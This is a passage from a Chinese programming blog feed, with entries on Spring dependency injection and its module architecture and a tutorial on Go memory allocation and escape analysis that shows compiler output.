用这个找给谁赋值<br>=======上面三个都是找给谁赋值，下面两个指的是赋什么值的==============<br>value:它能赋的值是基本数据类型和 String 类型<br>ref:它能赋的值是其他 bean 类型，也就是说，必须得是在配置文件中配置过的 bean<br>--&gt; <br>&lt;bean id=<span class="hljs-string">&quot;类&quot;</span> class=<span class="hljs-string">&quot;类的位置&quot;</span>&gt; <br>&lt;constructor-arg name=<span class="hljs-string">&quot;属性名&quot;</span> value=<span class="hljs-string">&quot;属性值&quot;</span>&gt;&lt;/constructor-arg&gt; <br>&lt;constructor-arg name=<span class="hljs-string">&quot;属性名&quot;</span> ref=<span class="hljs-string">&quot;其他bean类型的id&quot;</span>&gt;&lt;/constructor-arg&gt;<br>&lt;/bean&gt; <br>&lt;bean id=<span class="hljs-string">&quot;其他bean类型的id&quot;</span> class=<span class="hljs-string">&quot;类型&quot;</span>&gt;<br>&lt;/bean&gt;<br></code></pre></td></tr></table></figure><p><strong>2.使用属性的setter方法注入</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;!-- 通过配置文件给 bean 中的属性传值：使用 set 方法的方式<br>涉及的标签：<br>property<br>name：找的是类中 set 方法后面的部分<br>ref：给属性赋值是其他 bean 类型的<br>value：给属性赋值是基本数据类型和 string 类型的<br>实际开发中，此种方式用的较多。<br>--&gt; <br>&lt;bean id=<span class="hljs-string">&quot;类&quot;</span> class=<span class="hljs-string">&quot;类的位置&quot;</span>&gt; <br>&lt;property name=<span class="hljs-string">&quot;属性名&quot;</span> value=<span class="hljs-string">&quot;属性值&quot;</span>&gt;&lt;/property&gt; <br>&lt;property name=<span class="hljs-string">&quot;属性名&quot;</span> ref=<span class="hljs-string">&quot;其他bean类型的id&quot;</span>&gt;&lt;/property&gt;<br>&lt;/bean&gt; <br>&lt;bean id=<span class="hljs-string">&quot;其他bean类型的id&quot;</span> class=<span class="hljs-string">&quot;类型&quot;</span>&gt;<br>&lt;/bean&gt;<br></code></pre></td></tr></table></figure><p><strong>参考文献：[1] 陈恒，楼偶俊，张立杰.Java EE框架整和开发入门到实践[M].清华大学出版社，2018-：.12-16</strong><br><strong>案例来自于黑马程序员Spring教学</strong></p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>java</tag>
      
      <tag>spring</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于Spring框架的总结（一、spring的简单概述）</title>
    <link href="/2022/09/22/%E5%85%B3%E4%BA%8ESpring%E6%A1%86%E6%9E%B6%E7%9A%84%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80%E3%80%81spring%E7%9A%84%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0%EF%BC%89/"/>
    <url>/2022/09/22/%E5%85%B3%E4%BA%8ESpring%E6%A1%86%E6%9E%B6%E7%9A%84%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80%E3%80%81spring%E7%9A%84%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer">﻿# 关于Spring框架的总结（一、spring的简单概述）<h2 id="1-简介概述"><a href="#1-简介概述" class="headerlink" title="1.简介概述"></a>1.简介概述</h2><blockquote><p>关于Spring框架的简单介绍<br>1.1.什么是spring？<br>1.2.spring框架有哪些特点优势？<br>1.3.spring框架的体系结构</p></blockquote><h2 id="1-1-什么是spring"><a href="#1-1-什么是spring" class="headerlink" title="1.1.什么是spring"></a><strong>1.1.什么是spring</strong></h2>   <p>    Spring是一个轻量级Java开发框架，最早由Rod Johnson创建，目的是为了解决企业级应用开发的业务逻辑层和其他各层的耦合问题。它是一个分层的JavaSE/EE full-stack(-站式)轻量级开源框架，为开发Java应用程序提供全面的基础架构支持。<font color="red">以 IoC（Inverse Of Control：反转控制）和 AOP（Aspect Oriented Programming：面向切面编程）为内核</font>，提供了展现层 Spring MVC 和持久层 Spring JDBC 以及业务层事务管理等众多的企业级应用技术，还能整合开源世界众多著名的第三方框架和类库。Spring 负责基础架构，因此Java开发者可以专注于应用程序的开发。   </p><h2 id="1-2-spring框架有哪些特点优势？"><a href="#1-2-spring框架有哪些特点优势？" class="headerlink" title="1.2.spring框架有哪些特点优势？"></a>1.2.spring框架有哪些特点优势？</h2><p>1.降低组件之间的耦合性，通过 Spring 提供的 IoC 容器，可以将对象间的依赖关系交由 Spring 进行控制，避免硬编码所造成的过度程序耦合。</p><p>2.对AOP编程的支持，方便面向切面编程。</p><p>3.通过声明式方式灵活的进行事务的管理，提高开发效率和质量。</p><p>4.方便集成各种优秀框架，如hibernate,Struts2,JPA等</p><p>5.Spring具有高度可开放性，并不强制依赖于Spring，可以自由选择Spring部分或全部</p><p>6.方便程序的测试，可以用非容器依赖的编程方式进行几乎所有的测试工作。</p><h2 id="1-3-spring框架的体系结构"><a href="#1-3-spring框架的体系结构" class="headerlink" title="1.3.spring框架的体系结构"></a>1.3.spring框架的体系结构</h2><p>Spring框架至今已集成20多个模块，这些模块发布在核心容器（Core Container）、数据访问&#x2F;集成(Data Access&#x2F;Integration) 层. Web层. AOP ( Aspect Oriented Programming,<br>面向切面的编程)模块、植入(Instrumentation) 模块、消息传输(Messaging)和测试(Test)模块中，如下图。</p><p><img src="https://img-blog.csdnimg.cn/20200709115142920.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMDA5MjYy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>1、核心容器</strong><br>Spring的核心容器是其他模块建立的基础，由Spring core 、Spring beans、 Sping comtext、Spring context-support和Spring expression (Spring 表达式语言)等模块组成。</p><table><thead><tr><th>模块</th><th>功能作用</th></tr></thead><tbody><tr><td>Spring-core 模块</td><td>提供了框架的基本组成部分，包括控制反转(Inversion of Control,IoC)和依赖注入(Dependency Injection, DI)功能。</td></tr><tr><td>Spring-beans模块</td><td>提供了BeanFactory, 是工厂模式的一个经典实现，Spring将管理对象称为Bean。</td></tr><tr><td>Spring-context 模块</td><td>建立在Core和Beans模块的基础之上，提供一个框架式的对象访问方式，是访问定义和配置的任何对象的媒介。ApplicationContext 接口是Context模块的焦点。</td></tr><tr><td>Spring-context-support 模块</td><td>支持整合第三方库到Spring 应用程序上下文，特别是用于高速缓存(EhCache、JCache)和任务调度(CommonJ、Quartz) 的支持。</td></tr><tr><td>Spring-expression 模块</td><td>提供了强大的表达式语言去支持运行时查询和操作对象图。这是对JSP2.1规范中规定的统一表达式语言 (UnifiedEL) 的扩展。该语言支持设置和获取属性值、属性分配、方法调用、访问数组、集合和索引器的内容、逻辑和算术运算、变量命名以及从Spring的IoC容器中以名称检索对象。它还支持列表投影、选择以及常见的列表聚合。</td></tr></tbody></table><p><strong>2.AOP和Instrumentation</strong></p><table><thead><tr><th>模块</th><th>功能作用</th></tr></thead><tbody><tr><td>Spring-aop 模块</td><td>提供了一个符合AOP要求的面向切面的编程实现，允许定义方法拦截器和切入点，将代码按照功能进行分离，以便干净地解耦。</td></tr><tr><td>Spring-aspects模块</td><td>提供了与AspectJ的集成功能，AspectJ 是一个功能强大且成熟的AOP框架</td></tr><tr><td>Spring istrument模块</td><td>提供了类植入(nstrumentatonon) 支持和类加载器的实现，可以在特定的应用服务器中使用。</td></tr></tbody></table><p><strong>3.消息</strong></p><blockquote><p>spring 4.0以后新增了消息(Spring messaging)模块，该模块提供了对消息传递体系结构和协议的支持</p></blockquote><p><strong>4数据访问&#x2F;集成</strong></p><blockquote><p>数据访间集成层由JDBC、ORM. OXM. JMS和事务模块组成。</p></blockquote><table><thead><tr><th>模块</th><th>功能作用</th></tr></thead><tbody><tr><td>Spring-jdbc模块</td><td>提供了一个 JDBC的抽象层，消除了烦琐的JDBC编码和数据库厂商特有的错误代码解析。</td></tr><tr><td>Spring om模块</td><td>为流行的对象关系映射(Objeet Relational Mapping) API提供集成层，包括JPA和Hibemate.使用Spring orm模块可以将这些O&#x2F;R映射框架与Spring提供的所有其他功能结合使用，例如声明式事务管理功能。</td></tr><tr><td>Spring-oxm 模块</td><td>提供了一个支持对象&#x2F;XML映射的抽象层实现，例如JAXB、Castor、 JiBX和XStream。</td></tr><tr><td>Spring-jms 模块(Java Messaging Serice)</td><td>指Java消息传递服务，包含用于生产和使用消息的功能。自Sping.1以后，提供了与Spring mesgingg模块的集成。</td></tr><tr><td>Sping-tg模块(事务模块)</td><td>支持用于实现特殊接口和所有POIO (普通Java对象)类的编程和事务式声明管理</td></tr></tbody></table><p><strong>5.Web</strong></p><blockquote><p>Web层由Spring-web. Spring webmvc、Spring websocket和Portet模块组成。</p></blockquote><table><thead><tr><th>模块</th><th>功能作用</th></tr></thead><tbody><tr><td>Spring-web模块</td><td>提供了基本的Web开发集成功能， 例如多文件上传功能、使用Servlet监听器初始化一个 loC容器以及Web应用上下文。</td></tr><tr><td>Spring-webmvc模块</td><td>也称为Web-Servlet模块，包含用于Web应用程序的SpringMVC和REST Web Services实现。Spring MVC框架提供了领城模型代码和Web表单之间的清晰分离，并与Spring Framework的所有其他功能集成</td></tr><tr><td>Spring-websocket 模块</td><td>Spring 4.0以后新增的模块，它提供了WebSocket和SockJS的实现。</td></tr><tr><td>Portler模块</td><td>类似于Serlet模块的功能，提供了Porlet环境下的MVC实现。</td></tr></tbody></table><p><strong>6.测试</strong></p><blockquote><p>Spring-test 模块支持使用JUnit或TestNG对Spring组件进行单元测试和集成测试。</p></blockquote><p>参考文献：[1] 陈恒，楼偶俊，张立杰.Java EE框架整和开发入门到实践[M].清华大学出版社，2018-：.1-7</p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>java</tag>
      
      <tag>spring</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Golang内存分配与内存逃逸</title>
    <link href="/2022/09/20/Go%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E4%B8%8E%E5%86%85%E5%AD%98%E9%80%83%E9%80%B8/"/>
    <url>/2022/09/20/Go%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E4%B8%8E%E5%86%85%E5%AD%98%E9%80%83%E9%80%B8/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"># Go内存分配与内存逃逸<h2 id="内存为什么需要管理"><a href="#内存为什么需要管理" class="headerlink" title="内存为什么需要管理"></a>内存为什么需要管理</h2><p>当存储的东西越来越多，也就发现物理内存的容量依然是不够用，那么对物理内存的利用率和合理的分配，管理就变得非常的重要。</p><p>（1）操作系统就会对内存进行非常详细的管理。</p><p>（2）基于操作系统的基础上，不同语言的内存管理机制也应允而生，有的一些语言并没有提供自动的内存管理模式，有的语言就已经提供了自身程序的内存管理模式，如表2所示。</p><h6 id="表2-自动与非自动内存管理的语言"><a href="#表2-自动与非自动内存管理的语言" class="headerlink" title="表2 自动与非自动内存管理的语言"></a>表2 自动与非自动内存管理的语言</h6><table><thead><tr><th><strong>内存自动管理的语言（部分）</strong></th><th><strong>内存非自动管理的语言（部分）</strong></th></tr></thead><tbody><tr><td>Golang</td><td>C</td></tr><tr><td>Java</td><td>C++</td></tr><tr><td>Python</td><td>Rust</td></tr></tbody></table><p>所以为了降低内存管理的难度，像C、C++这样的编程语言会完全将分配和回收内存的权限交给开发者，而Rust则是通过生命周期限定开发者对非法权限内存的访问来自动回收，因而并没有提供自动管理的一套机制。但是像Golang、Java、Python这类为了完全让开发则关注代码逻辑本身，语言层提供了一套管理模式。因为Golang编程语言给开发者提供了一套内存管理模式，所以开发者有必要了解一下Golang做了哪些助力的功能。</p><p>在理解Golang语言层内存管理之前，应先了解操作系统针对物理内存做了哪些管理的方式。当插上内存条之后，通过操作系统是如何将软件存放在这个绿色的物理内存条中去的。</p><h2 id="为什么需要关心内存分配问题"><a href="#为什么需要关心内存分配问题" class="headerlink" title="为什么需要关心内存分配问题"></a><strong>为什么需要关心内存分配问题</strong></h2><hr><p>每个工程师的时间都如此宝贵，在继续读这篇文章之前，需要你先回答几个问题，如果得到的答案是否定的，那可能本文章里写的内容对你并没有什么帮助。但是，如果你遇到了因内存分配而导致的性能问题，可能这篇文章能带你理解 Golang 的内存分配的冰山一角，带你入个门。</p><p>问题如下：</p><ul><li>你的程序是性能敏感型吗？</li><li>GC 带来的延迟影响到了你的程序性能吗？</li><li>你的程序有过多的堆内存分配吗？</li></ul><p>如果你命中上面问题的其中一个或两个，那这篇文章适合你继续读下去。或你根本不知道如何回答这些问题，可能去了解下 go 性能观测相关的知识（pprof 的使用等）对你更有帮助。</p><p><strong>下面正文开始。</strong></p><h2 id="Golang-简要内存划分"><a href="#Golang-简要内存划分" class="headerlink" title="Golang 简要内存划分"></a><strong>Golang 简要内存划分</strong></h2><hr><p><img src="https://ask.qcloudimg.com/http-save/5469577/b1e2510bc404791b9a0909da0a0f1a99.webp?imageView2/2/w/1620/format/jpg" alt="img"></p><p>可以简单的认为 Golang 程序在启动时，会向操作系统申请一定区域的内存，分为栈（Stack）和堆（Heap）。栈内存会随着函数的调用分配和回收；堆内存由程序申请分配，由垃圾回收器（Garbage Collector）负责回收。性能上，栈内存的使用和回收更迅速一些；尽管Golang 的 GC 很高效，但也不可避免的会带来一些性能损耗。因此，Go 优先使用栈内存进行内存分配。在不得不将对象分配到堆上时，才将特定的对象放到堆中。</p><h2 id="内存分配过程分析"><a href="#内存分配过程分析" class="headerlink" title="内存分配过程分析"></a><strong>内存分配过程分析</strong></h2><hr><p>本部分，将以代码的形式，分别介绍栈内存分配、指针作为参数情况下的栈内存分配、指针作为返回值情况下的栈内存分配并逐步引出逃逸分析和几个内存逃逸的基本原则。</p><p>正文开始，Talk is cheap，show me the code。</p><h2 id="栈内存分配"><a href="#栈内存分配" class="headerlink" title="栈内存分配"></a><strong>栈内存分配</strong></h2><p>我将以一段简单的代码作为示例，分析这段代码的内存分配过程。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">package main<br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br>func <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>) &#123;  n := <span class="hljs-number">4</span>  n2 := <span class="hljs-title function_">square</span>(n)  fmt.<span class="hljs-title class_">Println</span>(n2)&#125;<br>func <span class="hljs-title function_">square</span>(n int) int&#123;  <span class="hljs-keyword">return</span> n * n&#125;<br></code></pre></td></tr></table></figure><p>复制</p><p>代码的功能很简单，一个 main 函数作为程序入口，定义了一个变量n，定义了另一个函数 squire ，返回乘方操作后的 int 值。最后，将返回的值打印到控制台。程序输出为16。</p><p>下面开始逐行进行分析，解析调用时，go 运行时是如何对内存进行分配的。</p><p><img src="https://ask.qcloudimg.com/http-save/5469577/479e83aa67b17d920bd71f6625afe1c9.webp?imageView2/2/w/1620/format/jpg" alt="img"></p><p>当代码运行到第6行，进入 main 函数时，会在栈上创建一个 Stack frame，存放本函数中的变量信息。包括函数名称，变量等。</p><p><img src="https://ask.qcloudimg.com/developer-images/article/5469577/h4jok0khik.png?imageView2/2/w/1620" alt="img"></p><p>当代码运行到第7行时，go 会在栈中压入一个新的 Stack Frame，用于存放调用 square 函数的信息；包括函数名、变量 n 的值等。此时，计算4 * 4 的值，并返回。</p><p><img src="https://ask.qcloudimg.com/http-save/5469577/e595bc8e8421e68646c147ea1cb411ab.webp?imageView2/2/w/1620/format/jpg" alt="img"></p><p>当 square 函数调用完成，返回16到 main 函数后，将16赋值给 n2变量。注意，原来的 stack frame 并不会被 go 清理掉，而是如栈左侧的箭头所示，被标记为不合法。上图夹在红色箭头和绿色箭头之间的横线可以理解为 go 汇编代码中的 SP 栈寄存器的值，当程序申请或释放栈内存时，只需要修改 SP 寄存器的值，这种栈内存分配方式省掉了清理栈内存空间的耗时【1】。</p><p><img src="https://ask.qcloudimg.com/developer-images/article/5469577/m6ls2qtdbl.png?imageView2/2/w/1620" alt="img"></p><p>接下来，调用 fmt.Println 时，SP 寄存器的值会进一步增加，覆盖掉原来 square 函数的 stack frame，完成 print 后，程序正常退出。</p><h2 id="指针作为参数情况下的栈内存分配"><a href="#指针作为参数情况下的栈内存分配" class="headerlink" title="指针作为参数情况下的栈内存分配"></a><strong>指针作为参数情况下的栈内存分配</strong></h2><p>还是同样的过程，看如下这段代码。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">package main<br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br>func <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>) &#123;  n := <span class="hljs-number">4</span>  <span class="hljs-title function_">increase</span>(&amp;n)  fmt.<span class="hljs-title class_">Println</span>(n)&#125;<br>func <span class="hljs-title function_">increase</span>(<span class="hljs-params">i *int</span>) &#123;  *i++&#125;<br></code></pre></td></tr></table></figure><p>main 作为程序入口，声明了一个变量 n，赋值为4。声明了一个函数  increase，使用一个 int 类型的指针 i 作为参数，increase 函数内，对指针 i 对应的值进行自增操作。最后 main 函数中打印了 n 的值。程序输出为5。</p><p><img src="https://ask.qcloudimg.com/developer-images/article/5469577/7snaopjz26.png?imageView2/2/w/1620" alt="img"></p><p>当程序运行到 main 函数的第6行时，go 在栈上分配了一个 stack frame ，对变量 n 进行了赋值，n 在内存中对应的地址为0xc0008771，此时程序将继续向下执行，调用 increase 函数。</p><p><img src="https://ask.qcloudimg.com/developer-images/article/5469577/nzbfzfdkup.png?imageView2/2/w/1620" alt="img"></p><p>这时，increase 函数对应的 stack fream 被创建，i 被赋值为变量 n对应的地址值0xc0008771，然后进行自增操作。</p><p><img src="https://ask.qcloudimg.com/developer-images/article/5469577/u14njxdglz.png?imageView2/2/w/1620" alt="img"></p><p>当 increase 函数运行结束后，SP 寄存器会上移，将之前分配的 stack freme 标记为不合法。此时，程序运行正常，并没有因为 SP 寄存器的改动而影响程序的正确性，内存中的值也被正确的修改了。</p><h2 id="指针作为返回值情况下的栈内存分配"><a href="#指针作为返回值情况下的栈内存分配" class="headerlink" title="指针作为返回值情况下的栈内存分配"></a><strong>指针作为返回值情况下的栈内存分配</strong></h2><p>文章之前的部分分别介绍了普通变量作为参数和将指针作为参数情况下的栈内存使用，本部分来介绍将指针作为返回值，返回给调用方的情况下，内存是如何分配的，并引出内存逃逸相关内容。来看这段代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">package main<br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br>func <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>) &#123;  n := <span class="hljs-title function_">initValue</span>()  fmt.<span class="hljs-title class_">Println</span>(*n/<span class="hljs-number">2</span>)&#125;<br>func <span class="hljs-title function_">initValue</span>() *int &#123;  i := <span class="hljs-number">4</span>  <span class="hljs-keyword">return</span> &amp;i&#125;<br></code></pre></td></tr></table></figure><p>main 函数中，调用了 initValue 函数，该函数返回一个 int 指针并赋值给 n，指针对应的值为4。随后，main 函数调用 fmt.Println 打印了指针 n &#x2F; 2对应的值。程序输出为2。</p><p><img src="https://ask.qcloudimg.com/developer-images/article/5469577/945gf1ih2a.png?imageView2/2/w/1620" alt="img"></p><p>程序调用 initValue 后，将 i 的地址赋值给变量 n 。注意，如果这时，变量 i 的位置在栈上，则可能会随时被覆盖掉。</p><p><img src="https://ask.qcloudimg.com/developer-images/article/5469577/8ydk3bi2lv.png?imageView2/2/w/1620" alt="img"></p><p>在调用 fmt.Println 时，Stack Frame 会被重新创建，变量 i 被赋值为*n&#x2F;2也就是2，会覆盖掉原来 n 所指向的变量值。这会导致及其严重的问题。在面对 sharing up 场景时，go 通常会将变量分配到堆中，如下图所示：</p><p><img src="https://ask.qcloudimg.com/http-save/5469577/16ab1617ecd4832e038e07e9a612fd69.webp?imageView2/2/w/1620/format/jpg" alt="img"></p><p>通过上面的分析，可以看到在面对被调用的函数返回一个指针类型时将对象分配到栈上会带来严重的问题，因此 Go 将变量分配到了堆上。这种分配方式保证了程序的安全性，但也不可避免的增加了堆内存创建，并需要在将来的某个时候，需要 GC 将不再使用的内存清理掉。</p><h2 id="内存分配原则"><a href="#内存分配原则" class="headerlink" title="内存分配原则"></a><strong>内存分配原则</strong></h2><hr><p>经过上述分析，可以简单的归纳几条原则。</p><ul><li>Sharing down typically stays on the stack 在调用方创建的变量或对象，通过参数的形式传递给被调用函数，这时，在调用方创建的内存空间通常在栈上。这种在调用方创建内存，在被调用方使用该内存的“内存共享”方式，称之为 Sharing down。</li><li>Sharing up typically escapes to the heap 在被调用函数内创建的对象，以指针的形式返回给调用方的情况下，通常，创建的内存空间在堆上。这种在被调用方创建，在调用方使用的“内存共享”方式，称之为 Sharing up。</li><li>Only the compiler knows 之所以上面两条原则都加了通常，因为具体的分配方式，是由编译器确定的，一些编译器后端优化，可能会突破这两个原则，因此，具体的分配逻辑，只有编译器（或开发编译器的人）知道。</li></ul><h2 id="使用-go-build-命令确定内存逃逸情况"><a href="#使用-go-build-命令确定内存逃逸情况" class="headerlink" title="使用 go build 命令确定内存逃逸情况"></a><strong>使用 go build 命令确定内存逃逸情况</strong></h2><hr><p>值得注意的是，Go 在判断一个变量或对象是否需要逃逸到堆的操作，是在编译器完成的；也就是说，当代码写好后，经过编译器编译后，会在二进制中进行特定的标注，声明指定的变量要被分配到堆或栈。可以使用如下命令在编译期打印出内存分配逻辑，来具体获知特定变量或对象的内存分配位置。</p><p>查看 go help 可以看到 go build 其实是在调用 go tool compile。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">go help build ... -gcflags <span class="hljs-string">&#x27;[pattern=]arg list&#x27;</span>        <span class="hljs-variable language_">arguments</span> to pass on each go tool compile invocation....<br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">go tool compile -h...-m    print optimization decisions...-l    disable inlining...<br></code></pre></td></tr></table></figure><p>其中，需要关心的参数有两个，</p><ul><li>-m 显示优化决策</li><li>-l 禁止使用内联【2】</li></ul><p>代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript">package main<br>func <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>) &#123;  n := <span class="hljs-title function_">initValue</span>()  <span class="hljs-title function_">println</span>(*n / <span class="hljs-number">2</span>)<br>  o := <span class="hljs-title function_">initObj</span>()  <span class="hljs-title function_">println</span>(o)<br>  f := <span class="hljs-title function_">initFn</span>()  <span class="hljs-title function_">println</span>(f)<br>  num := <span class="hljs-number">5</span>  result := <span class="hljs-title function_">add</span>(num)  <span class="hljs-title function_">println</span>(result)&#125;<br>func <span class="hljs-title function_">initValue</span>() *int &#123;  i := <span class="hljs-number">3</span>                <span class="hljs-comment">// ./main.go:19:2: moved to heap: i  return &amp;i&#125;</span><br>type <span class="hljs-title class_">Obj</span> struct &#123;  i int&#125;<br>func <span class="hljs-title function_">initObj</span>() *<span class="hljs-title class_">Obj</span> &#123;  <span class="hljs-keyword">return</span> &amp;<span class="hljs-title class_">Obj</span>&#123;<span class="hljs-attr">i</span>: <span class="hljs-number">3</span>&#125;      <span class="hljs-comment">// ./main.go:28:9: &amp;Obj literal escapes to heap&#125;</span><br>func <span class="hljs-title function_">initFn</span>() <span class="hljs-title function_">func</span>(<span class="hljs-params"></span>) &#123;  <span class="hljs-keyword">return</span> <span class="hljs-title function_">func</span>(<span class="hljs-params"></span>) &#123;       <span class="hljs-comment">// ./main.go:32:9: func literal escapes to heap    println(&quot;I am a function&quot;)  &#125;&#125;</span><br>func <span class="hljs-title function_">add</span>(i int) int &#123;  <span class="hljs-keyword">return</span> i + <span class="hljs-number">1</span>&#125;<br></code></pre></td></tr></table></figure><p>完整的构建命令和输出如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">go build -gcflags=<span class="hljs-string">&quot;-m -l&quot;</span> <br># _/<span class="hljs-title class_">Users</span>/rocket/workspace/stack-or-heap./main.<span class="hljs-property">go</span>:<span class="hljs-number">19</span>:<span class="hljs-number">2</span>: moved to <span class="hljs-attr">heap</span>: i./main.<span class="hljs-property">go</span>:<span class="hljs-number">24</span>:<span class="hljs-number">9</span>: &amp;<span class="hljs-title class_">Obj</span> literal escapes to heap./main.<span class="hljs-property">go</span>:<span class="hljs-number">28</span>:<span class="hljs-number">9</span>: func literal escapes to heap<br></code></pre></td></tr></table></figure><p>可以看到，sharing up 的情况（initValue，initObj，initFn）内存空间被分配到了堆上。sharing down 的情况（add）内存空间在栈上。</p><p>这里给读者留个问题，大家可以研究下 moved to heap 和 escapes to heap 的区别。</p><h1 id="内存逃逸"><a href="#内存逃逸" class="headerlink" title="内存逃逸"></a>内存逃逸</h1><h2 id="怎么答"><a href="#怎么答" class="headerlink" title="怎么答"></a><strong>怎么答</strong></h2><p><code>golang程序变量</code>会携带有一组校验数据，用来证明它的整个生命周期是否在运行时完全可知。如果变量通过了这些校验，它就可以在<code>栈上</code>分配。否则就说它 <code>逃逸</code> 了，必须在<code>堆上分配</code>。</p><p>能引起变量逃逸到堆上的<strong>典型情况</strong>：</p><ul><li><strong>在方法内把局部变量指针返回</strong> 局部变量原本应该在栈中分配，在栈中回收。但是由于返回时被外部引用，因此其生命周期大于栈，则溢出。</li><li><strong>发送指针或带有指针的值到 channel 中。</strong> 在编译时，是没有办法知道哪个 <a href="https://www.zhihu.com/search?q=goroutine&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22article%22,%22sourceId%22:%22145468000%22%7D">goroutine</a> 会在 channel 上接收数据。所以编译器没法知道变量什么时候才会被释放。</li><li><strong>在一个切片上存储指针或带指针的值。</strong> 一个典型的例子就是 []*string 。这会导致切片的内容逃逸。尽管其后面的数组可能是在栈上分配的，但其引用的值一定是在堆上。</li><li><strong>slice 的背后数组被重新分配了，因为 append 时可能会超出其容量( cap )。</strong> slice 初始化的地方在编译时是可以知道的，它最开始会在栈上分配。如果切片背后的存储要基于运行时的数据进行扩充，就会在堆上分配。</li><li><strong>在 interface 类型上调用方法。</strong> 在 interface 类型上调用方法都是动态调度的 —— 方法的真正实现只能在运行时知道。想像一个 io.Reader 类型的变量 r , 调用 r.Read(b) 会使得 r 的值和切片b 的背后存储都逃逸掉，所以会在堆上分配。</li></ul><h2 id="举例"><a href="#举例" class="headerlink" title="举例"></a><strong>举例</strong></h2><ul><li>通过一个例子加深理解，接下来尝试下怎么通过 <code>go build -gcflags=-m</code> 查看逃逸的情况。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-keyword">type</span> A <span class="hljs-keyword">struct</span> &#123;<br> s <span class="hljs-type">string</span><br>&#125;<br><span class="hljs-comment">// 这是上面提到的 &quot;在方法内把局部变量指针返回&quot; 的情况</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">foo</span><span class="hljs-params">(s <span class="hljs-type">string</span>)</span></span> *A &#123;<br> a := <span class="hljs-built_in">new</span>(A) <br> a.s = s<br> <span class="hljs-keyword">return</span> a <span class="hljs-comment">//返回局部变量a,在C语言中妥妥野指针，但在go则ok，但a会逃逸到堆</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br> a := foo(<span class="hljs-string">&quot;hello&quot;</span>)<br> b := a.s + <span class="hljs-string">&quot; world&quot;</span><br> c := b + <span class="hljs-string">&quot;!&quot;</span><br> fmt.Println(c)<br>&#125;<br></code></pre></td></tr></table></figure><p>执行<code>go build -gcflags=-m main.go</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span 